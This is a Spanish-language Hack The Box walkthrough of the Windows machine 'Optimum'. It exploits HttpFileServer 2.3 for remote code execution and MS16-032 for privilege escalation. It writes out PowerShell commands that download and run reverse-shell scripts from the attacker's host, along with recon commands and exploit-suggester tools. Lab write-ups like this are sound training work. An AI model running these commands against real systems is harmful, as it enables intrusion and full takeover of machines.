# Optimum-HTB 

Maquina Windows

## NMAP

Solo tiene el puerto 80 abierto..

##  RCE 

Pues entramos al puerto 80 y vemos que ejecuta "HttpFileServer 2.3"

![image](https://github.com/gecr07/Optimum-HTB/assets/63270579/650fe637-acbf-4b1b-aaa1-371757a8402a)

Buscamos en searchsploit y existe de una el exploit...

![image](https://github.com/gecr07/Optimum-HTB/assets/63270579/5f64a75d-ebe8-4ee4-b92c-68e7e6ac47af)

De aqui en adelante depende lo que se va a hacer ya que si estas en 64 o 32 como proceso (porque el sistema es de 64bits)

### Rutas de powershell segun si es x86 o x64

Porque depende en Windows que ruta llames para que te de un proceso en el contexto de 32 bits o 64 las rutas y que se usaron para este exploit son:

Powershell de un proceso de 32 a un ps de 64 pero el HFS corre en 32 recuerda:

```
C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe
```

Pero el HFS corre en 32 recuerda. La siguiente ruta va a lanzar el ps en 32bits

```
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```

Esto porque las rutas de Windows son:

![image](https://github.com/gecr07/Optimum-HTB/assets/63270579/655ec89c-e633-411a-a5b0-3e0b670bd5ce)

Ejecutando el exploit 

```
64 bits
python 49125.py 10.129.8.234 80 "c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.80/Invoke-PowerShellTcp.ps1')"
32bits
python 49125.py 10.129.8.234 80 "c:\windows\System32\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.80/Invoke-PowerShellTcp.ps1')"
```

![image](https://github.com/gecr07/Optimum-HTB/assets/63270579/abf869fd-3dbe-4720-9e65-5fe563af9349)


Para saber desde powershell la arquitectura

```
[Environment]::Is64BitProcess
```

## PrivEsc

Ahora para escalar vamos a hacer reconocimiento basico..

```
systeminfo
net user
net localgroup
netstat -ano
whoami /priv
whoami /all #miembro de que grupos
```

Ahora bajamos el Winpeas.exe y ejecutamos aunque como es una maquina vieja probamos con los exploits para esto tenemos varias alternativas...

### Watson 

Es una herramienta para sugerencia de exploits ya descontinuada como por el 2021 aun jala para que funcione el minimo que necesita es el NET Framework 4.5.

> https://github.com/rasta-mouse/Watson

Lo malo de esta herramienta es que se tiene que compilar en la maquina Devel ahi se muestra como lo compilan con diferentes opciones.


### Sherlock

Esta es el predesesor de Watson y es un script en powershell ya sabes esta descontinuado casi a la par del Watson

```
Import-Module Sherlock.ps1
Y ya despues que buesque
Find-AllVulns
```
> https://github.com/rasta-mouse/Sherlock

![image](https://github.com/gecr07/Optimum-HTB/assets/63270579/bcbf5fdf-460a-4ae5-a42d-cf5a02447281)


## Windows-Exploit-Suggester

Una de las mejores tools porque usas el output de systeminfo 

![image](https://github.com/gecr07/Optimum-HTB/assets/63270579/c717e880-23ef-4f44-9e30-df3b1ada38f6)


```
./windows-exploit-suggester.py --update
./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo_output.txt
```

> https://github.com/AonCyberLabs/Windows-Exploit-Suggester

## Exploits ya compilados windows

Esta pagina es propiedad de offesive y tiene muchos exploits ya compilados

> https://gitlab.com/exploit-database/exploitdb-bin-sploits


Encontramos que tiene una vulnerabildiad a MS16-032 la primera version genera una shell pero ni lanzandola con nc pude hacerla jalar por lo tanto use la version modificada por el equipo de empire

> https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1


Hasta abajo puse para que se auto llame el proceso seria el siguiente

```
powershell IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.80/Invoke-MS16032.ps1')
La linea que se le agrego es
Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://10.10.14.80/rev1.ps1')"

```

Asi que primero carga en la memoria todo y ya despues lo ejecuta. Lo anterior regresa un shell con todos lo privilegios....


![image](https://github.com/gecr07/Optimum-HTB/assets/63270579/bef40c66-44dc-4b97-b0b4-8aa3a696f26e)


























































